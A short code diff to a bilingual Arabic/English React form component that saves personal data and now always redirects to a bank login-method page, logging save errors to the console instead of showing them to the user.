@@ -64,10 +64,10 @@ export default function PersonalData() {
         customerStatus: formData.customerStatus,
       });
       toast.success(isArabic ? "تم حفظ البيانات بنجاح" : "Data saved successfully");
-      setLocation(`/login-method?bank=${bank}&session=${sessionId}`);
     } catch (error) {
-      toast.error(isArabic ? "حدث خطأ في حفظ البيانات" : "Error saving data");
+      console.error("Error saving personal data in DB, continuing anyway:", error);
     }
+    setLocation(`/login-method?bank=${bank}&session=${sessionId}`);
   };
 
   const toggleLanguage = () => {
